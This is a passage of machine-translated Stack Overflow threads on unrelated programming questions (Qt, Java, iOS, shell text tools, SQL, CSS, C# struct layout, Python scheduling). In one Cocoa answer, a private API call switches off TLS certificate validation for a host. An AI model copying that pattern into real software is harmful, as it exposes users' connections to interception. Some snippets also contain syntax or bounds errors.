如果我在 StonePriceWindow 的标题中有这个“StonePriceWindow() {}”，我会遇到以下错误：“指定了多个默认构造函数”并且始终是“没有适当的等..”

感谢您的帮助，我不明白为什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-04T14:14:39.533

对不起，但我无法对最佳答案添加评论..

我也有类似的问题，似乎我创建的代码的类名与 Qt .ui 文件中对话框的 objectName 属性值不匹配。

我在 QtDesigner 中打开了 .ui 文件，并将 objectName 属性值更改为我在代码中使用的类名。之后的编译进展顺利。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:18:10.337

尝试添加 StonePriceWindow(){} 并删除其他构造函数的默认参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:19:25.950

当您编写类似的代码时

```
StonePriceWindow x; 
```

编译器如何知道您是调用无参数构造函数还是另一个具有默认值的构造函数`parent`？

您需要删除另一个，或从中删除默认值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T16:08:11.510

我发现了问题。在 StonePrinceWindow.ui 中，有一个过时的 UI 名称，因此自动生成的 ui_stonepricewindow 保留过时的名称（即使在清理之后），编译器永远找不到 ctor。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-11-08T21:50:53.750

解决方案是更改字符串

```
#ifndef COSTSIMULATOR_H
#define COSTSIMULATOR_H 
```

在文件 costsimulator.h 和 ui_costsimulator.h 中的任何一个中

Qt`#ifndef #define`在自动生成的 ui_costsimulator.h 中放置相同的表达式

# java - 将字段限制为类的实例并同时实现接口

> ID：15392030
> 
> 赞同：2
> 
> 时间：2013-03-13T17:14:42.940
> 
> 标签：java, oop

Java 允许将子类实例分配给类类型字段，例如：

```
public class BaseClass {

}

public class SubClass extends BaseClass {

}

public class Example {

    private BaseClass field1;

    public void assign(SubClass subclass) {
        field1 = subclass; // is OK
    }

} 
```

Java 也允许使用接口作为类型。如果我们有一个接口`Fooable`，

```
public interface Fooable {
    void foo();
} 
```

我们的`Example`类可以有一个类型的字段`Fooable`，

```
 Fooable field2; 
```

也就是说，可以分配给`field2`任何实现`Fooable`接口的类的实例。

但是如果我想告诉编译器`field3`必须**既是**接口的实例`BaseClass`又是`Fooable`接口的实现呢？所以，如果有一个类

```
public class FooSubClass extends BaseClass implements Fooable {
    @Override
    public void foo() {
        // TODO
    }
} 
```

，我可以分配给`field3`实例`FooSubClass`但不是`SubClass`？是否可以不使用任何类型的**泛型？**

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-13T17:18:33.573

你不能像你试图做的那样做。

您需要定义另一个类，也许抽象类适合您：

```
public class abstract AbstractSubClass extends BaseClass implements Fooable {
    ...
} 
```

然后`FooSubClass`：

```
public class FooSubClass extends AbstractSubClass {
    ...
} 
```

那么你的领域是：

```
private AbstractSubClass field1; 
```

哪个会接受`FooSubClass`但不会`SubClass`

它是编译器可以保证 field1 实际上具有所有必需方法的实现的唯一方法。

* * *

这是一个教科书示例来说明：

```
public class Bird() {
    public void eat() { 
        ....
    }
}

public interface FlyingBehaviour() {
    void fly();
}

public abstract class FlyingBird extends Bird implements FlyingBehaviour() {
    ...
}

public class Eagle extends FlyingBird {
    ...
}

public class Penguin extends Bird {
    ...
}

FlyingBird bird = new Eagle();
bird.fly();

FlyingBird bird = new Penguin(); //Compilation Error - Penguins cant fly! 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:24:44.040

java中没有办法确保一个对象字段继承/实现两个不同的类。假设您可以控制这里的所有对象，最简单的解决方法是让您的基类实现 Fooable。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:23:14.103

由于您使用分配方法来设置字段，因此您可以在该方法中使用 instanceof 检查它是否是正确的对象类型。

```
public void assign(BaseClass baseClass) {
    if (baseClass instanceof foo)
       field3 = baseClass;
} 
```

如果提供了未实现 foo 的类，您可能会抛出异常。

编辑：Doh，没有看到修复应该是编译时的。

# ios - UITextField 只允许输入英文字母

> ID：15392031
> 
> 赞同：1
> 
> 时间：2013-03-13T17:14:43.260
> 
> 标签：ios, objective-c, uitextfield, character

我想将用户名字段的输入限制为仅限英文字母（az）。有人可以帮我添加到下面的代码中，以不允许输入除英文字母之外的任何数字、字符和任何其他语言吗？

现在下面的代码不允许空格，也不允许输入超过 10 个字母。

```
- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string {
{
    BOOL _isAllowed = YES;
    NSString *nameRegex = @"[A-Za-z]+";
    NSPredicate *nameTest = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", nameRegex];

    NSString *tempString = [[textField.text stringByReplacingCharactersInRange:range withString:string] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];

    if (textField == self.usernameField)
    {
        if ([self.usernameField.text isEqualToString:tempString])
        {
            self.title.text = @"No Spaces Allowed";
            self.title.textColor = [UIColor yellowColor];

            _isAllowed =  NO;
        }

        else if (tempString.length > 10)
        {
            self.title.text = @"Username cannot be more than 10 letters.";
            self.title.textColor = [UIColor yellowColor];

            _isAllowed =  NO;
        } 
```

**更新**：

```
 else if (![nameTest evaluateWithObject:self.usernameField.text])
        {
                self.title.text = @"Username can only contain english letters.";
                self.title.textColor = [UIColor yellowColor];

                _isAllowed =  NO;
        }
        return   _isAllowed;
    }

    return   _isAllowed;
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-13T17:18:05.880

您可以使用此正则表达式来检查用户名是否仅包含英文字母：

```
NSString *nameRegex = @"[A-Za-z]+";
NSPredicate *nameTest = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", nameRegex];

if(![nameTest evaluateWithObject:self.usernameField.text]){
        self.title.text = @"Username can only contain english letters.";
        self.title.textColor = [UIColor yellowColor];

        _isAllowed =  NO;
} 
```

# javascript - jQuery textbox focus() 将光标放在任何地方

> ID：15392034
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:14:49.503
> 
> 标签：javascript, jquery, position, cursor, focus

我在下面有一个javascript：

```
function modify(value){
    $('.ajax').html($('.ajax input').val());
    $('.ajax').removeClass('ajax');
    $(value).addClass('ajax');
    $(value).html(
            '<input id="editbox"' + ' type="text" value="' + $(value).text() + '"/>');
    $('#editbox').focus();
} 
```

问题是光标放在开头。有没有我可以把它放在任何我想要的地方的解决方案？Fe 如果我单击文本中间，我希望光标在那里，以便我可以从那里编辑文本。

谢谢

编辑：如果我用左/右箭头导航到我想要的位置，我只能修改我的值。如果我单击中间，光标就会消失。

**知道了！稍后将粘贴代码**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:23:47.953

您可以将光标定位在文本的末尾：

```
$(document).on('focus','#editbox',function(){        
     this.value = this.value;
}); 
```

# sed - sed/awk/cut/grep - 提取字符串的最佳方法

> ID：15392036
> 
> 赞同：2
> 
> 时间：2013-03-13T17:14:51.007
> 
> 标签：sed, awk, grep, cut

我有一个以这种格式构造的 results.txt 文件：

```
Uncharted 3: Javithaxx l Rampant l Graveyard l Team Deathmatch HD (D1VpWBaxR8c)
Matt Darey feat. Kate Louise Smith - See The Sun (Toby Hedges Remix) (EQHdC_gGnA0)
The Matrix State (SXP06Oax70o)
Above & Beyond - Group Therapy Radio 014 (guest Lange) (2013-02-08) (8aOdRACuXiU) 
```

我想创建一个新文件，提取每行“8aOdRACuXiU”中最后一个字符中指定的 youtube URL ID

我正在尝试在新文件中构建这样的 URL： [http ://www.youtube.com/watch?v=8aOdRACuXiU&hd=1](http://www.youtube.com/watch?v=8aOdRACuXiU&hd=1)

请注意，我将 &hd=1 附加到要替换的字符串中。我曾尝试使用 Linux reverse and cut 但 reverse 或 rev munges 我的数据。这里最难的部分是我的文本文件中的每一行都有带括号的条目，我只关心获取最后一组括号之间的数据。每行都有可变长度，所以这也无济于事。在行尾使用 grep 和 .$ 怎么样？

总之，我想从 results.txt 中提取 youtube ID 并将其导出到以下格式的新文件：[http ://www.youtube.com/watch?v=8aOdRACuXiU&hd=1](http://www.youtube.com/watch?v=8aOdRACuXiU&hd=1)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:28:35.287

使用`awk`：

```
awk '{ 
  v = substr( $NF, 2, length( $NF ) - 2 )
  printf "%s%s%s\n", "http://www.youtube.com/watch?v=", v, "&hd=1" 
}' infile 
```

它产生：

```
http://www.youtube.com/watch?v=D1VpWBaxR8c&hd=1
http://www.youtube.com/watch?v=EQHdC_gGnA0&hd=1
http://www.youtube.com/watch?v=SXP06Oax70o&hd=1
http://www.youtube.com/watch?v=8aOdRACuXiU&hd=1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:20:10.937

```
$ sed 's!.*(\(.*\))!http://www.youtube.com/watch?v=\1\&hd=1!' results.txt 
http://www.youtube.com/watch?v=D1VpWBaxR8c&hd=1
http://www.youtube.com/watch?v=EQHdC_gGnA0&hd=1
http://www.youtube.com/watch?v=SXP06Oax70o&hd=1
http://www.youtube.com/watch?v=8aOdRACuXiU&hd=1 
```

在这里，`.*(\(.*\))`查找最后出现的一对括号，并捕获这些括号内的字符。然后使用 将捕获的组插入到 URL 中`\1`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-13T17:39:22.913

使用[perl](/questions/tagged/perl "显示标记为“perl”的问题")单线：

```
perl -lne 'printf "http://www.youtube.com/watch?v=%s&hd=1\n", $& if /[^\(]+(?=\)$)/' file.txt 
```

或多行版本：

```
perl -lne '
    printf(
        "http://www.youtube.com/watch?v=%s&hd=1\n",
        $&
    ) if /[^\(]+(?=\)$)/
' file.txt 
```

# command-line - 在命令行中保留具有特定相同列的文本内容

> ID：15392038
> 
> 赞同：0
> 
> 时间：2013-03-13T17:14:59.753
> 
> 标签：command-line, sed, comm

基本上我尝试像这样在命令行中操作文件：

```
File1:
,1,this is some content,
,2,another content,
,3,blablabla,
,4,xxxxxxxx,
,5,yyyyyyyy,
,6,zzzzzzzzzz,
... ...

File2:
1
3
4 
5 
```

现在我想保持 file1 的内容在 file2 中具有相同的列号，所以输出应该是：

```
,1,this is some content,
,3,blablabla,
,4,xxxxxxxx,
,5,yyyyyyyy, 
```

我用过`comm -3 file1 file2`，但它不起作用。然后我尝试了 sed 但也没有用。还有其他方便的工具吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:18:21.423

以下将适用于给定的示例 - 如果数字出现在逗号后面的字符串中，它将不起作用：

```
grep -F -f File2 File1 
```

另一种选择是

```
join -t, -1 2 -2 1 -o 1.1, 1.2, 1.3 File1 File2 
```

以下是它的工作原理：

```
-t，将 `,` 视为终止符
-1 2 查看文件 1 中的第二列
-2 1 查看文件 2 中的第一列
-o 1.1, 1.2, 1.3 输出文件1的第一、二、三列

```

这仍然有一个缺点，如果后面的文本中有多个逗号，它会在第一个逗号之后终止（“字段 3”是最后一个输出）。

解决该问题需要使用`xargs`：

```
join -t, -1 2 -2 1 -o 1.1, 1.2 File1 File2 | xargs -Ixx grep xx File1 
```

**解释：**

`-Ixx``xx`: 用前面命令的每个输出行替换后面命令中的字符串；为每一行执行该命令。这意味着我们将找到与第一行匹配的行，`,number,`这将使我们对其他任何内容都不敏感。

# sql - 具有多个列和行的枢轴

> ID：15392039
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:15:02.337
> 
> 标签：sql, pivot, unpivot

你能帮我实现以下目标吗

我有这个 SQL 输出表

```
日期周 Keep_1 This_1 Order_1 Keep_2 This_2 Order_2 Keep_1-Keep_2 This_1-This_2 Order_1-Order_2
2013 年 1 月 1 日 9 8 7 6 5 4 3 3 3
```

并将其变成

```
RowOrder Column_1 Column_2 Column_1-Column_2
保持 9 6 3
这 8 5 3
订购 7 4 3
```

如您所见，我必须保持行中的顺序，所以我不能按字母顺序排列。此外，我必须将它们堆叠`Keep_1 This_1 Order_1`在一起并一起`Keep_2 This_2 Order_2`操作`Column_1``Column_2`

任何想法如何实现这一目标？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:25:48.627

如果您使用的是 SQL Server 2008+，那么您可以使用`CROSS APPLY`and `VALUES`：

```
select c.roworder,
  c.col1,
  c.col2,
  c.col3
from yourtable t
cross apply
(
  values 
    ('Keep', Keep_1, Keep_2, Keep_1_Keep_2),
    ('This', This_1, This_2, This_1_This_2),
    ('Order', Order_1, Order_2, Order_1_Order_2)
) c (roworder, col1, col2, col3) 
```

请参阅[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/36569/5)。

这也可以使用`UNION ALL`任何数据库中的查询来完成：

```
select 'Keep' RowOrder, 
  Keep_1 col1, 
  Keep_2 col2, 
  Keep_1_Keep_2 col3
from yourtable
union all
select 'This' RowOrder, 
  This_1 col1, 
  This_2 col2, 
  This_1_This_2 col3
from yourtable
union all
select 'Order' RowOrder, 
  Order_1 col1, 
  Order_2 col2, 
  Order_1_Order_2 col3
from yourtable 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/36569/7)

# cocoa - 使用 NSURLConnection 忽略 SSL 证书错误

> ID：15392043
> 
> 赞同：1
> 
> 时间：2013-03-13T17:15:25.657
> 
> 标签：cocoa, nsurlconnection, sendasynchronousrequest

我正在使用`[NSURLConnection sendAsynchronousRequest:request queue:[NSOperationQueue mainQueue] completionHandler:^(NSURLResponse *response, NSData *data, NSError *error)]`从 Web 服务中提取数据，但是 Web 服务器具有自颁发的证书，导致出现此错误：

![SSL 错误](../Images/01619bb72cec8d67d5bd0d15a54bace6.png)

错误显示使用：

```
NSAlert *a = [NSAlert alertWithError:error];
[a runModal]; 
```

有没有办法忽略这个错误并继续？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-14T15:31:32.147

按照链接问题中的说明，我为 NSURLConnection 定义了一个虚拟接口：

```
@interface NSURLRequest (DummyInterface)
+ (void)setAllowsAnyHTTPSCertificate:(BOOL)allow forHost:(NSString*)host;
@end 
```

并在创建请求之前调用该方法：

```
[NSURLRequest setAllowsAnyHTTPSCertificate:YES forHost:[url host]];
NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:url]; 
```

这抑制了有关证书无效的错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-20T22:01:33.383

这可能会被 Apple 拒绝。使用正确的 NSConnectiondatadelegate 实现：

想办法解决它： [Stackoverflow 对类似问题的回应](https://stackoverflow.com/questions/933331/how-to-use-nsurlconnection-to-connect-with-ssl-for-an-untrusted-cert)

# css - 了解 CSS 行高属性

> ID：15392044
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:15:26.393
> 
> 标签：css

我正在使用以下站点的 line-height 属性：

[http://www.w3schools.com/css/tryit.asp?filename=trycss_float6](http://www.w3schools.com/css/tryit.asp?filename=trycss_float6)

```
div.container
{
    width:100%;
    margin:0px;
    border:1px solid gray;
    line-height:150%;
} 
```

我试图了解 line-height 并阅读了以下内容：

> 在块级元素上，line-height CSS 属性指定元素内行框的最小高度。

从：

[https://developer.mozilla.org/en-US/docs/CSS/line-height#Examples](https://developer.mozilla.org/en-US/docs/CSS/line-height#Examples)

但有趣的是，在上面来自 w3schools 的示例中，更改 line-height 属性会增加包含 div 元素的大小，这似乎与 mozilla 站点中的声明相矛盾。因此，如果有人能提供澄清线高的实际作用，我将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:40:55.840

当我们想要沿 y 轴对齐块元素之间时，实际上给出了 line-height。

例如，我有一个单行文本

w3schools

段高度为 20px。该段落将以自己的默认方式编写，但如果我使用 line-height 等于段落的高度，则文本输入

假设 W3schools 将沿 y 轴在中间对齐。如果你想水平对齐（x 轴对齐）你的文本，那么 text-align:center 用于此目的。

请记住， line-height 并不完全取决于其自身元素的高度。但它的变化如下。

1.  如果您有单行文本，

    height 为 20px 然后给 line-height: 20px 以垂直对齐文本或文本的垂直中间。

2.  如果你有两行文字，

    高度为 20px，然后给出 line-height:10px 并使用小的 padding-top 垂直对齐文本。

我希望这会让你振作起来。我认为你不需要更多地浏览谷歌。如果您需要更多解释，那么我会给您 jfiddle 代码。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:27:41.033

It's not contradictory. Setting the line-height property on a `div` will apply the same line-height property to all inline children. So in your example, by setting the line-height property on the div, any child elements that are `display: inline` will have the new line-height applied to them. When the height of those child elements is increased, the height of the parent `div` increases to be able to contain the child elements.

# javascript - ASP - 如何将 HTML 表格导出到 Excel？

> ID：15392047
> 
> 赞同：0
> 
> 时间：2013-03-13T17:15:31.357
> 
> 标签：javascript, asp-classic

我正在使用通过 SQL 生成 HTML 表的旧经典 ASP 页面。目前，在表格生成后，用户点击一个按钮，将用户重定向到另一个页面并重新运行 SQL 以生成一个新表格，但是这个新页面的内容类型设置为 Excel 格式。

我想消除这种开销，而是根据表的 ID 将 HTML 表传递到下一页。

我知道我可以通过 JavaScript 找到该对象，`document.getElementById('IdHere');`但是如何将该变量传递到下一页？

以下是当前的表单结构：

```
<form method="post" name="xlsexport" target="_blank" 
    action="payment_analysis_xls.asp?<%=Request.QueryString%>&filename=paymentAnalysis.xls">
    <a href="javascript:void(0);" onclick="javascript:document.xlsexport.submit();">Export to Excel</a>&nbsp;
    <input type="image" src="xls.gif"/>
    <input type="hidden" name="report" value="analysis"/></form> 
```

我假设我必须将表单的 onClick 事件更改为我创建的函数，该函数将按 ID 获取表。但是我该如何从那里开始呢？

谢谢！

# c++ - MFC列表控件并将数组添加到第二列

> ID：15392050
> 
> 赞同：0
> 
> 时间：2013-03-13T17:15:35.960
> 
> 标签：c++, mfc

我在将数组添加到列表控件的第二列时遇到问题。问题是，第二列中的填充行数与第一列中填充的行数相同。我的代码是：

```
enter code here

for (int i=0; i<velikost; i++) // velikost = 10 (velikost is size)
{
    niz.Format(_T("%d"),polje[i]);
    m_listCtrl.InsertItem(i,niz);
}

polje_stevcev = new int[max]; // new array with size of max number

for(int i=0; i<max + 1; i++) // lets say the max is 90
{
    polje_stevcev[i] = 0;
    niz2.Format(_T("%d"), polje_stevcev[i]);
    m_listCtrl.SetItemText(i,1,niz2); 
}`enter code here` 
```

我们在第二个 for 循环中看到该循环执行了 90 次，但在第二列的列表控件中只显示前 10 行，其他为空。

图片（第二列应为 95 行，编号为 0，但仅显示 10）：[这是屏幕截图](http://shrani.si/f/2t/Be/2PyBZE5A/slika1.jpg)

谢谢。

# c# - LayoutKind.explicit 对于本身是结构的字段的 .NET 行为

> ID：15392054
> 
> 赞同：2
> 
> 时间：2013-03-13T17:15:49.563
> 
> 标签：c#, .net, struct, offset, layoutkind.explicit

# 问题

我尝试`SA`使用 构建一个结构 () `[StructLayout(LayoutKind.Explicit)]`，它有一个字段是另一个`struct`( `SB`)。

**首先**：我很惊讶我被允许声明其他结构没有`[StructLayout(LayoutKind.Explicit)]`，而在 中`SA`，所有字段都*必须*有`[FieldOffset(0)]`，否则编译器会大喊大叫。这没有多大意义。

*   这是编译器警告/错误中的漏洞吗？

**第二**：好像把里面的所有reference( `object`)字段`SB`都移到了前面`SB`。

*   这种行为在任何地方都有描述吗？
*   它依赖于实现吗？
*   它是否在任何依赖于实现的地方定义？`:)`

**注意**：我不打算在生产代码中使用它。我问这个问题主要是出于好奇。

# 实验

```
// No object fields in SB
// Gives the following layout (deduced from experimentation with the C# debugger):

// | f0 | f4 and i | f8 and j | f12 and k | f16 |

[StructLayout(LayoutKind.Explicit)]
struct SA {
    [FieldOffset(0)] int f0;
    [FieldOffset(4)] SB sb;
    [FieldOffset(4)] int f4;
    [FieldOffset(8)] int f8;
    [FieldOffset(12)] int f12;
    [FieldOffset(16)] int f16;
}
struct SB { int i; int j; int k; }

// One object field in SB
// Gives the following layout:

// | f0 | f4 and o1 | f8 and i | f12 and j | f16 and k |

// If I add an `object` field after `j` in `SB`, i *have* to convert
// `f4` to `object`, otherwise I get a `TypeLoadException`.
// No other field will do.

[StructLayout(LayoutKind.Explicit)]
struct SA {
    [FieldOffset(0)] int f0;
    [FieldOffset(4)] SB sb;
    [FieldOffset(4)] object f4;
    [FieldOffset(8)] int f8;
    [FieldOffset(12)] int f12;
    [FieldOffset(16)] int f16;
}
struct SB { int i; int j; object o1; int k; }

// Two `object` fields in `SB`
// Gives the following layout:

// | f0 | f4 and o1 | f8 and o2 | f12 and i | f16 and j | k |

// If I add another `object` field after the first one in `SB`, i *have* to convert
// `f8` to `object`, otherwise I get a `TypeLoadException`.
// No other field will do.

[StructLayout(LayoutKind.Explicit)]
struct SA {
    [FieldOffset(0)] int f0;
    [FieldOffset(4)] SB sb;
    [FieldOffset(4)] object f4;
    [FieldOffset(8)] object f8;
    [FieldOffset(12)] int f12;
    [FieldOffset(16)] int f16;
}
struct SB { int i; int j; object o1; object o2; int k; } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T18:28:06.710

> 这是编译器警告/错误中的漏洞吗？

不，这没什么错。允许字段重叠，这就是为什么 LayoutKind.Explicit 首先存在的原因。它允许在非托管代码中声明*联合*的等价物，C# 中不支持。您不能突然停止在结构声明中使用 [FieldOffset]，运行时坚持要求您在结构的所有成员上使用它。在技​​术上不是必需的，而是一个避免错误假设的简单要求。

> 似乎 SB 中的所有参考（对象）字段都被移动了

是的，这很正常。CLR 以未记录和无法发现的方式布置对象。它使用的确切规则没有记录，并且可能会发生变化。它也不会因不同的抖动而重复。在对象被编组、Marshal.StructureToPtr() 调用或由 pinvoke 编组器隐式调用之前，布局不会变得可预测。这是唯一一次确切的布局很重要。[我在这个答案](https://stackoverflow.com/a/3362736/17034)中写了关于这种行为的理由。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:25:15.043

第一个问题的答案是否定的，编译器的错误报告中没有漏洞或错误。如果您开始进行显式布局，编译器将假定您知道自己在做什么（在限制范围内——见下文）。您告诉它将一个结构覆盖在另一个结构之上。编译器不（也不应该）关心您覆盖的结构也没有明确布局。

如果编译器*确实*关心，那么您将无法覆盖任何未明确布局的类型，这意味着在一般情况下您无法进行联合。例如，考虑尝试覆盖 a`DateTime`和 a `long`：

```
[StructLayout(LayoutKind.Explicit)]
struct MyUnion
{
    [FieldOffset(0)]
    public bool IsDate;
    [FieldOffset(1)]
    public DateTime dt;
    [FieldOffset(1)]
    public long counter;
} 
```

`DateTime`除非明确说明，否则不会编译。可能不是你想要的。

就将引用类型放在明确布局的结构中而言，您的结果将是……可能不是您所期望的。例如，考虑一下这个简单的部分：

```
struct MyUnion
{
    [FieldOffset(0)]
    public object o1;
    [FieldOffset(0)]
    public SomeRefType o2;
} 
```

这在很大程度上违反了类型安全。如果它编译（它很可能），当你尝试使用它时它会因 TypeLoadException 而死。

编译器将尽可能防止您违反类型安全。我不知道编译器是否知道如何处理这些属性并布局结构，或者它是否只是通过生成的 MSIL 将布局信息传递给运行时。可能是后者，考虑到您的第二个示例，其中编译器允许特定布局但运行时被 TypeLoadException 轰炸。

对 [structlayout.explicit reference types] 的 Google 搜索揭示了一些有趣的讨论。请参阅[在显式结构中相互覆盖多个 CLR 引用字段？](https://stackoverflow.com/q/2703604/56778)， 例如。

# python - 在 apscheduler 中捕获日志

> ID：15392058
> 
> 赞同：4
> 
> 时间：2013-03-13T17:16:03.197
> 
> 标签：python, logging, apscheduler

如何从[apscheduler](http://pythonhosted.org/APScheduler/)捕获作业中的日志？

假设，我有以下工作

```
@sched.interval_schedule(hours=3)
def some_job():
    log.info('I was here.')
    log.info('And here.') 
```

和一个听众

```
sched.add_listener(job_listener,
                       events.EVENT_JOB_EXECUTED |
                       events.EVENT_JOB_MISSED |
                       events.EVENT_JOB_ERROR)

def job_listener(event):
    # how do I get the logged messages here? 
```

如何访问 中的消息`job_listener`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T13:59:16.327

这可以使用线程安全队列来完成

```
import logging

import Queue
from apscheduler import events
from apscheduler.scheduler import Scheduler
import time

#logging.basicConfig(level=logging.INFO,format='%(asctime)s : %(name)s : %(levelname)s : %(module)s.%(funcName)s(%(lineno)d) : %(thread)d %(threadName)s: %(message)s')

#enable logger to see exceptions caught by apscheduler
logging.basicConfig()

q = Queue.Queue()

sched = Scheduler()

@sched.interval_schedule(seconds=1)
def some_job():
    msg = "Decorated job : %s" % time.time()
    print msg
    logging.info(msg)
    q.put(msg)
    q.put("message 2")

def job_listener(event):
    #print str(event)
    while not q.empty():
        get_ = "msg from job '%s': '%s'" % (event.job, q.get())
        print get_
        logging.info(get_)

sched.add_listener(job_listener,
                   events.EVENT_JOB_EXECUTED |
                   events.EVENT_JOB_MISSED |
                   events.EVENT_JOB_ERROR)

config = {'apscheduler.jobstores.file.class': 'apscheduler.jobstores.shelve_store:ShelveJobStore',
          'apscheduler.jobstores.file.path': '/temp/dbfile'}

sched.configure(config)

sched.start()

q.join()
while True:
    pass 
```

输出：

```
Decorated job : 1363960621.39
msg from job 'some_job ...: 'Decorated job : 1363960621.39'
msg from job 'some_job ...': 'message 2'
Decorated job : 1363960622.4
msg from job 'some_job ...: 'Decorated job : 1363960622.4'
msg from job 'some_job ...: 'message 2'
Decorated job : 1363960623.39 
```

# c - C 结构创建错误未命名类型

> ID：15392059
> 
> 赞同：4
> 
> 时间：2013-03-13T17:16:08.033
> 
> 标签：c, struct

我只是想在没有太多 C 知识的情况下建立一个简单的递归结构（必须以某种方式学习）

这是我的 make 编译行

```
g++ -o cs533_hw3 main.c 
```

这是我的代码

```
typedef struct Node Node;

struct Node
{
    int texture;
    float rotation;
    Node *children[2];
};

Node rootNode;
rootNode.rotation 
```

这是我在最后一行的错误

```
error: 'rootNode' does not name a type 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-13T17:17:17.183

代码必须在 C 中的函数中。您可以在全局范围内声明变量，但不能在其中放置语句。

更正示例：

```
typedef struct Node Node;

struct Node
{
    int texture;
    float rotation;
    Node *children[2];
};

Node rootNode;

int main(void)
{
    rootNode.rotation = 12.0f;
    return 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:20:34.137

看起来不错。但是您可能想对 rootNode.rotation 做点什么？

```
Node rootNode;
memset(&rootNode, 0, sizeof(rootNode)); // zero everything there
rootNode.rotation = .5f; 
```

# ios - 带有 URL 链接的图片

> ID：15392062
> 
> 赞同：2
> 
> 时间：2013-03-13T17:16:10.490
> 
> 标签：ios, url, uiimageview, hyperlink

我将尝试解释我的疑问，但请考虑到我是 Xcode 的新手，我有很多东西要学。在我的 iPhone 应用程序中，我希望当我触摸图像时，应用程序会重定向到外部 Web URL。是否可以直接从情节提要中做到这一点？我没有使用 ViewController，所以我无法调用该函数。

先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:23:23.413

1.  在情节提要中添加一个按钮。
2.  将按钮设置为自定义并将图像指定为按钮的背景。
3.  从按钮的 IBAction 使用您的 URL 启动 Safari 浏览器。

以下是使用您的 URL 启动 Safari 浏览器的方法（从[此处](https://stackoverflow.com/a/1343372/1031955)获取此代码）：

```
NSURL *url = [NSURL URLWithString:@"http://www.stackoverflow.com"];
if (![[UIApplication sharedApplication] openURL:url]) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:24:15.103

更简单的选择是，我建议使用`UIButton`所需的图像，并提供打开您的 Web URL 的按钮*操作方法。*

如果您只想使用`UIImageView`，则在其上添加点击*手势识别*器，这将为您提供点击事件。通过该事件方法，您可以调用您的 Web URL。

这是一个提供有关手势识别器的详细说明的[链接。](http://iosdevelopertips.com/event-handling/gestures-recognizers-tap-pinchzoom-rotate-swipe-pan-long-press.html)

希望这会帮助你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:21:24.320

您可以使用 UIButton 而不是 UIImage，并将图像分配给 InterfaceBuilder 中的 Button。

在必须连接到您的 UIButton 的 IBAction 插座中，您必须编写以下代码：

```
NSURL *url = [ [ NSURL alloc ] initWithString: @"http://www.cnn.com" ];
[[UIApplication sharedApplication] openURL:url]; 
```

由于您必须将情节提要的 Outlets 链接到 Viewcontroller 以处理 UIButton 的点击，因此您必须使用 ViewController。

我还强烈建议阅读 Apple 在他的应用程序中使用的 MVC 模式的基础知识。我从未见过有人在不使用 Viewcontrollers 的情况下编写应用程序。它们通常包含您所有的 App Logic。

# php - URL 重定向到另一个域的子域

> ID：15392063
> 
> 赞同：1
> 
> 时间：2013-03-13T17:16:12.380
> 
> 标签：php, javascript, html, redirect

我有两个域：`project1.com`和`project2.com`. 后者包含一个子域作为`login.project2.com`. 我需要将用户重定向到这个地方，即`login.project2.com`根据他的输入从前者重定向。（不要问逻辑，或者我为什么这样做，只是因为我被要求这样做）。

我尝试了以下方法：

```
function redirectToPage() {
    if (someVar == someValue) {
        document.location = 'http://www.login.project2.com'; // does not work
        document.location = 'www.login.project2.com'; // does not work
        document.location = 'http://login.project2.com'; // does not work
        document.location = 'login.project2.com'; // inval

        //only of the above is left uncommented at a time
    }
} 
```

但是，当我直接在地址栏中键入第四个时，它会将我带到所需的页面。我哪里错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:17:45.957

1.  document.location 已弃用，可能是只读的
2.  如果您有另一个域，则也需要该协议。如果您将其保留在地址栏上，则由浏览器添加，而不是在脚本中。
3.  将语句括在括号中是一种很好的做法，因此我为您添加了它们

这是使用 JavaScript 重定向的方法 - 我使用替换，因此旧地址在历史记录中被替换，因此后退按钮不会损坏

```
function redirectToPage() {
  if (someVar == someValue) {
    window.location.replace('http://login.project2.com'); 
  }
} 
```

# .net - WCF 调用 Axis2 Web 服务 - System.ServiceModel.FaultException: BusinessObject

> ID：15392065
> 
> 赞同：2
> 
